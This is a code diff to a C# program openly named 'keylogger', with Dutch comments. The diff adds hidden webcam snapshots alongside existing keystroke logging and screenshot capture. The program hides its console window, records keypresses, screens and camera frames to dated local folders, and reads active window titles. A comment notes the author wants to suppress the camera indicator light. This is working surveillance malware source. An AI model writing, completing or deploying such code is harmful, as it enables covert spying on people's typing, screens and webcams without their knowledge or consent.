@@ -9,6 +9,8 @@ using System.Threading;
 using System.IO;
 using System.Drawing;
 using System.Drawing.Imaging;
+using AForge.Video;
+using AForge.Video.DirectShow;
 
 
 
@@ -20,7 +22,6 @@ namespace keylogger
 
         #region [strings en anderen shit]
 
-        private static int teller;
         private static DateTime datum = DateTime.Now;
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
@@ -29,6 +30,13 @@ namespace keylogger
         private static decimal hour ;
         private static decimal minuten ;
         private static decimal seconde ;
+
+        #region [webcam]
+
+        static FilterInfoCollection WebcamColl;
+        static VideoCaptureDevice Device;
+
+        #endregion
 
         #endregion
 
@@ -40,6 +48,8 @@ namespace keylogger
         static int SW_HIDE = 0;
         #endregion
 
+
+
         static void Main(string[] args)
         {
             IntPtr myWindow = GetConsoleWindow();
@@ -47,10 +57,54 @@ namespace keylogger
 
             Thread o1 = new Thread(logkeys);
             Thread o2 = new Thread(aantal);
+            Thread o3 = new Thread(aantalwebshots);
 
             o1.Start();
             o2.Start();
+            o3.Start();
+
         }
+
+        // hij werk alleen moet nog kijken als ik het lampje uit kan zeten
+        #region [webcam]
+
+        #region [ aantal websnaphot]
+        private static void aantalwebshots()
+        {
+            for (int i = 0; i < 1500; i++)
+            {
+                Thread.Sleep(2500);
+                DateTime TimeNow = DateTime.Now;
+                seconde = TimeNow.Second;
+                WebcamColl = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                //if you have connected with one more camera choose index as you want 
+                Device = new VideoCaptureDevice(WebcamColl[0].MonikerString);
+                Device.Start();
+                Device.NewFrame += new NewFrameEventHandler(imagesave);
+            }
+        }
+
+        #endregion
+
+        #region [webcam fotos maken]
+        static void imagesave(object sender, NewFrameEventArgs eventArgs)
+        {
+            Image img = (Bitmap)eventArgs.Frame.Clone();
+            string fileName = ".jpg";
+            string folderName = @"D:/keylogger/webcam/";
+            string pathString = System.IO.Path.Combine(folderName, "" + datum.ToShortDateString() + "/");
+            System.IO.Directory.CreateDirectory(pathString);
+            img.Save(pathString + hour + "." + minuten + "." + seconde + fileName);
+            Device.SignalToStop();
+        }
+
+        #endregion
+
+        #endregion
+        
+        // volgens mij werk deze wel zo als het moet
+
+        #region[screenshots]
 
         #region [ aantal screenshots]
         private static void aantal()
@@ -63,8 +117,6 @@ namespace keylogger
                 hour = TimeNow.Hour;
                 minuten = TimeNow.Minute;
                 seconde = TimeNow.Second;
-                teller = 0;
-                teller += i;
                 printscreen();
             }
         }
@@ -94,14 +146,17 @@ namespace keylogger
 
         #endregion
 
+        #endregion
+
+        // keyloger moet nog wat aangepast worden
         #region [keylogger]
         static void logkeys()
         {
 
-            string folderName = "keylog";
+            string folderName = @"D:/keylogger/keylog";
             string pathString = System.IO.Path.Combine(folderName);
             System.IO.Directory.CreateDirectory(pathString);
-            string path = (@"D:/keylogger/"+pathString+"/"+ datum.ToShortDateString() + ".text");
+            string path = (pathString+"/"+ datum.ToShortDateString() + ".text");
 
             if (!File.Exists(path))
             {
@@ -115,7 +170,7 @@ namespace keylogger
             while (true)
             {
 
-                Thread.Sleep(10);
+                //Thread.Sleep(5);
 
                  for(Int32 i = 0; i<255; i++)
                  {
@@ -131,7 +186,7 @@ namespace keylogger
 
                             //hier zit het probleem
 
-
+                            
                             if (text == "Space")
                             {
 
@@ -141,13 +196,14 @@ namespace keylogger
                             else if (text == "Enter")
                             {
                                 sw.Write(" " + datum.ToLongTimeString());
-                                sw.Write(Environment.NewLine);
+                                sw.Write("[Enter]");
 
                             }
                             else if (text == "Back")
                             {
+
                                 
-                                sw.Write(text.Remove(text.Length - 1, 1));
+                                sw.Write("[Back]");
 
                             }
                             else
@@ -165,6 +221,25 @@ namespace keylogger
 
             }
             
+        }
+
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        private string GetActiveWindowTitle()
+        {
+            const int nChars = 256;
+            StringBuilder Buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, Buff, nChars) > 0)
+            {
+                return Buff.ToString();
+            }
+            return null;
         }
         #endregion
 
